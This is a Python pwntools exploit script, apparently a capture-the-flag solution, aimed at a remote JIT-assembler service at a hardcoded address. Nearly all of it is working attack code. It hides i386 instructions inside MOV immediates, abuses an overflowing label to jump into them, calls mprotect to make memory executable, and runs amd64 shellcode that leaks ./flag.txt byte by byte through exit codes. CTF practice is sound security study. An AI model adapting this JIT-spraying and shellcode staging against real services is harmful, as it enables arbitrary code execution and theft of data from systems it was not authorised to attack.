from __future__ import annotations

from typing import Optional, Iterable
from pwn import *  # pwntools

# ---------------------------------------------------------------------------
# Global pwntools context
# ---------------------------------------------------------------------------
context.arch      = "i386"
context.log_level = "CRITICAL"

# ---------------------------------------------------------------------------
# Target + constants
# ---------------------------------------------------------------------------
HOST = "94.237.61.242"
PORT = 38818

PAGE_SIZE         = 0x1000
SYS_MPROTECT      = 0x0A        # Linux x86 mprotect syscall number
PROT_RWX          = 0x7

# Target VM register mapping (VM hX registers <-> x86 regs we "name")
REGS = {
    "eax": "h0",
    "ebx": "h1",
    "ecx": "h2",
    "edx": "h3",
}

# ---------------------------------------------------------------------------
# Tiny DSL helpers for the custom JIT text-ISA the service expects
# Each returns a *line* of assembly in the service's mini-assembler.
# ---------------------------------------------------------------------------

def _reg(name: str) -> str:
    """Validate and translate an x86-ish reg name to the service's VM reg."""
    try:
        return REGS[name]
    except KeyError as e:
        raise ValueError(f"Unknown register '{name}', expected one of {list(REGS)}") from e


def mov(reg: str, value: int) -> bytes:
    """Emit: mov <hX>, <imm>"""
    return f"mov {_reg(reg)},{value}\n".encode()


def cmp_(reg0: str, reg1: str) -> bytes:
    """Emit: cmp <hX>, <hY> (used only as filler)"""
    return f"cmp {_reg(reg0)},{_reg(reg1)}\n".encode()


def ret_() -> bytes:
    """Emit: ret (end of function; returns to trigger JIT)"""
    return b"ret\n"


def label(name: str) -> bytes:
    """Define a local label (used for overflow target)."""
    return name.encode() + b":\n"


def jmp_(name: str) -> bytes:
    """Emit: jmp <label>"""
    return f"jmp {name}\n".encode()


def store(reg: str, idx: int) -> bytes:
    """Emit: str <hX>, <idx>   (store 32-bit hX into data section at offset idx)."""
    return f"str {_reg(reg)},{idx}\n".encode()


# Backwards-compat alias to avoid breaking old code references.
str = store  # noqa: A001  (intentional alias; we don't call Python's built-in str())


# ---------------------------------------------------------------------------
# Shellcode staging helpers
# ---------------------------------------------------------------------------

def create_atom(inst: str) -> bytes:
    """
    Build a 4-byte 'atom' by assembling a <=2-byte machine instruction and
    appending a short jump to skip the first byte of the *next* MOV immediate.

    This keeps the instruction stream properly aligned for the JIT that emits
    4-byte MOV-immediates; each atom is exactly 4 bytes:
        [inst (<=2 bytes)] [EB 01]   # jmp +1
    """
    code = asm(inst)
    assert len(code) <= 0x2, f"Atom too large ({len(code)} bytes): {inst!r}"
    return code + b"\xEB" + p8(0x01)


def assemble_first_stage() -> bytes:
    """
    Stage 1 (i386-sized atoms): executed first to make the data page RWX and
    then jump into it. Built from 4-byte atoms for alignment.
    """
    parts = []
    parts.append(create_atom("push edi; push edi"))  # (same opcode as push rdi)
    parts.append(create_atom("mov esi,ebx"))         # esi = PAGE_SIZE
    parts.append(create_atom("syscall"))             # mprotect(..., PROT_RWX)
    parts.append(create_atom("pop edi ; pop edi"))
    parts.append(create_atom("jmp edi"))             # jump to second stage
    sc = b"".join(parts)
    # Defensive pad; atoms are 4B each so this should already be aligned.
    if len(sc) % 4:
        sc += asm("nop") * (4 - (len(sc) % 4))
    return sc


def assemble_second_stage(byte_idx: int) -> bytes:
    """
    Stage 2 (amd64): open ./flag.txt, read into buffer, exit with flag[byte_idx]
    in low 8 bits of exit status (so the service prints a decimal byte).

    We right-pad to a fixed size so we can stream it as dwords cleanly.
    """
    with context.local(arch="amd64", bits=64):
        sc = asm(
            f"""
            /* open("./flag.txt", O_RDONLY) via int 0x80 for the target env */
        open:
            lea rbx, [rip+flag]
            mov ecx, 0x0
            mov eax, 0x5
            int 0x80

        read:
            mov edi, eax                  /* fd */
            lea rsi, [rip+flag_bytes]
            mov rdx, 0x100
            mov eax, SYS_read
            syscall

        exit:
            xor edi, edi
            lea rsi, [rip+flag_bytes]
            mov dil, BYTE PTR [rsi+{byte_idx}]
            mov eax, SYS_exit_group
            syscall

        flag:
            .string "./flag.txt"

        flag_bytes:
            """
        ).ljust(0x50, asm("nop"))  # ensure a multiple convenient length (0x50 == 80)
    return sc


def dwords(data: bytes) -> Iterable[int]:
    """
    Yield little-endian 32-bit chunks from data.
    Pads the last chunk with zeros if needed.
    """
    rem = len(data) % 4
    if rem:
        data += b"\x00" * (4 - rem)
    for i in range(0, len(data), 4):
        yield u32(data[i:i + 4])


# ---------------------------------------------------------------------------
# Network + orchestration
# ---------------------------------------------------------------------------

def conn() -> tube:
    """Create a fresh connection to the remote challenge."""
    return remote(HOST, PORT)


def build_payload(first_stage: bytes, second_stage: bytes) -> bytes:
    """
    Construct the full JIT program:
      1) Fill initial page with harmless instructions (prologue + filler).
      2) Stream stage-1 atoms via MOV-immediates (as 32-bit words).
      3) Stream stage-2 into data section via MOV + STR writes.
      4) Prepare registers for mprotect(PAGE, PAGE_SIZE, PROT_RWX).
      5) Overflow to a label and jmp into stage-1 to flip permissions,
         then ret to trigger JIT execution.
    """
    out: list[bytes] = []

    # 1) "Prologue" / filler to land JIT where we want it.
    # 15 + 41*5 + 17*2 = 254 (original comment), reproduced here.
    out.append(mov("eax", 0x0) * 41)
    out.append(cmp_("eax", "ebx") * 17)

    # 2) Emit first-stage atoms as u32 immediates into code stream.
    for w in dwords(first_stage):
        out.append(mov("eax", w))

    # 3) Write second stage into the data section.
    for off, w in enumerate(dwords(second_stage)):
        idx = off * 4
        out.append(mov("eax", w))
        out.append(store("eax", idx))

    # 4) Setup for mprotect(page_base=PAGE_SIZE, len=PAGE_SIZE, prot=RWX).
    out.append(mov("eax", SYS_MPROTECT))
    out.append(mov("ebx", PAGE_SIZE))  # page base the service expects
    out.append(mov("edx", PROT_RWX))   # PROT_READ | PROT_WRITE | PROT_EXEC

    # 5) Overflow label + jmp into the first stage, then ret to hand control over.
    overflow_lbl = "A" * 0x20
    out.append(label(overflow_lbl))
    out.append(jmp_(overflow_lbl))
    out.append(ret_())

    return b"".join(out)


def get_one_byte(idx: int) -> Optional[bytes]:
    """
    Connect, send a staged JIT payload purpose-built to exit() with the
    value of flag[idx] in its status code, parse the remote's decimal output,
    and return that single byte.

    Returns:
        - p8(byte) if the service returned a non-zero flag byte
        - None if the service returned 0 (end-of-flag sentinel)
    """
    p = conn()

    # Build both stages
    sc_first = assemble_first_stage()
    sc_second = assemble_second_stage(idx)

    # Construct the stream for the JIT VM
    payload = build_payload(sc_first, sc_second)

    # Send and parse the single printed number (decimal)
    p.sendline(payload)
    try:
        raw = p.recvall(timeout=5.0)
    finally:
        try:
            p.close()
        except Exception:
            pass

    # Robust-ish parse: take last whitespace-separated token, base-10
    try:
        last_tok = raw.strip().split()[-1]
        value = int(last_tok, 10)
    except Exception:
        # If parsing fails, treat as no byte recovered
        return None

    if value == 0:
        return None
    return p8(value & 0xFF)


# ---------------------------------------------------------------------------
# Main loop (progress UI via pwntools log)
# ---------------------------------------------------------------------------

def leak_flag() -> bytes:
    """
    Leak the flag one byte at a time by repeatedly running the staged payload.

    Stops when the remote returns 0 (end marker). Shows progress as it goes.
    """
    idx = 0
    flag = b""
    with log.progress("Flag....", level=logging.CRITICAL) as prog:
        while True:
            b = get_one_byte(idx)
            if b is None:
                prog.success(flag.decode(errors="ignore"))
                return flag
            flag += b
            prog.status(flag.decode(errors="ignore"))
            idx += 1


if __name__ == "__main__":
    leak_flag()
